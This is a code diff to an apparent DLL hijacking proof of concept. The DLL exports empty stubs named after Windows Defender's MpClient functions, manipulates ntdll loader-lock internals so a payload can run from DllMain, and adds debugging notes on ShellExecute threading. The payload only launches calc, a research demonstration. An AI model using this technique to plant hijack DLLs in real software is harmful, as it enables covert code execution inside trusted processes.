@@ -40,11 +40,20 @@ EXTERN_C API VOID MpCleanOpen(VOID) EMPTY_IMPL;
 EXTERN_C API VOID MpThreatEnumerate(VOID) EMPTY_IMPL;
 EXTERN_C API VOID MpRemapCallistoDetections(VOID) EMPTY_IMPL;
 
+// DEBUG NOTICE
+// Invoking ShellExecute with "calc" causes it to take a very different code path than if invoked with "calc.exe"
+// Not including a file extension is how we get the "SHCORE!_WrapperThreadProc" thread as seen in the "Perfect DLL Hijacking" article
+// Otherwise, ShellExecute goes directly to spawning the combase!CRpcThreadCache::RpcWorkerThreadEntry thread (among others)
+// See this occur as ShellExecute spawns threads in WinDbg: bp ntdll!LdrInitializeThunk
+// Investigating SHELL32.dll, this happens because SHELL32!CShellExecute::ExecuteNormal calls SHELL32!CShellExecute::_RunThreadMaybeWait (calc) instead of SHELL32!CShellExecute::_DoExecute (calc.exe) depending on the return value of CShellExecute::_ShouldCreateBackgroundThread
+// This fact matters for our debugging as it relates to the article because, in the second case (calc.exe), we don't get past the initial combase!CComApartment::StartServer -- (other functions) --> NdrCallClient2 deadlocked call stack unless we, as well as unlocking loader lock, also set loader events and set ntdll!LdrpWorkInProgess to zero at the same time
+// Why? This requires investigating the target process of this NdrClientCall2 RPC call. Guess: csrss.exe (https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem)
+
 VOID payload(VOID) {
     // Verify we've reached our payload:
     //__debugbreak();
     // Verify loader lock is gone in WinDbg: !critsec ntdll!LdrpLoaderLock
-    ShellExecute(NULL, L"open", L"calc.exe", NULL, NULL, SW_SHOW);
+    ShellExecute(NULL, L"open", L"calc", NULL, NULL, SW_SHOW);
 }
 
 // These functions are exported from ntdll.dll but do not exist in the header files so we need to prototype and import them
@@ -140,7 +149,7 @@ VOID modifyLdrEvents(BOOL doSet, const HANDLE events[], const SIZE_T eventsSize)
     }
 }
 
-VOID preloadLibraries(VOID) {
+VOID preloadLibrariesForCurrentThread(VOID) {
     // These are all the libraries ShellExecute loads before launching a new thread
     // They must be manually loaded before calling ShellExecute because LdrpWorkInProgress must be set to TRUE for loading libraries on this thread but FALSE for loading libraries on the new thread
     // Otherwise, we get stuck looping infinitely (high CPU usage) in LdrpDrainWorkQueue and hang
@@ -157,39 +166,6 @@ VOID preloadLibraries(VOID) {
     LoadLibrary(L"Wldp");
     LoadLibrary(L"advapi32");
     LoadLibrary(L"sechost");
-
-    // A Windows update occurred and now we also need to load these DLLs or we will crash/deadlock during ShellExecute
-    //
-    // Not loading one of them could cause a very strange and difficult to diagnose crash on one of the ntdll!TppWorkerThread threads 99% of the time
-    // Finally though, I got lucky with a clean deadlock on loading the kernel.appcore.dll library and noticed the issue (I should have been looking out for "ModLoad" messages in WinDbg the entire time)
-    LoadLibrary(L"kernel.appcore.dll");
-    LoadLibrary(L"uxtheme");
-    LoadLibrary(L"PROPSYS");
-    LoadLibrary(L"clbcatq");
-    LoadLibrary(L"CFGMGR32");
-    LoadLibrary(L"profapi");
-    LoadLibrary(L"edputil");
-    LoadLibrary(L"Windows.StateRepositoryPS.dll");
-    LoadLibrary(L"urlmon");
-    LoadLibrary(L"iertutil");
-    LoadLibrary(L"srvcli");
-    LoadLibrary(L"netutils");
-    LoadLibrary(L"SspiCli");
-    LoadLibrary(L"virtdisk");
-    LoadLibrary(L"FLTLIB");
-    LoadLibrary(L"wintypes");
-    LoadLibrary(L"appresolver");
-    LoadLibrary(L"Bcp47Langs");
-    LoadLibrary(L"SLC");
-    LoadLibrary(L"sppc");
-    LoadLibrary(L"OneCoreCommonProxyStub");
-    LoadLibrary(L"OneCoreUAPCommonProxyStub");
-    // Some nice bloatware we have here
-    // It seems like we now have to load all libraries ShellExecute will eventually load (even on its newly spawned threads)
-    // However, note that LdrFullUnlock with RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN undefined (i.e. calls CreateThread) still works perfectly fine without any "library preloading", which is interesting
-    //
-    // More research is required here. It would be good for someone to do a thorough analysis on the differences in control flows using code coverage instrumentation.
-    // For example, the code paths taken when ShellExecute is run inside DllMain vs. outside DllMain. Then we could really get to the bottom of this!
 }
 
 PULONG64 getLdrpWorkInProgressAddress() {
@@ -278,7 +254,7 @@ VOID LdrFullUnlock(VOID) {
     // Preparation steps past this point are necessary if you will be creating new threads
     // And other scenarios, generally I notice it's necessary whenever a payload indirectly calls: __delayLoadHelper2
 #ifdef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN
-    preloadLibraries();
+    preloadLibrariesForCurrentThread();
 #endif
     modifyLdrEvents(TRUE, events, eventsCount);
     // This is so we don't hang in ntdll!ldrpDrainWorkQueue of the new thread (launched by ShellExecute) when it's loading more libraries
@@ -293,7 +269,7 @@ VOID LdrFullUnlock(VOID) {
     //
 
 #ifdef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN
-    // Libraries loaded by API call(s) must be preloaded
+    // Libraries for this thread must be preloaded
     payload();
 #else
     DWORD payloadThreadId;
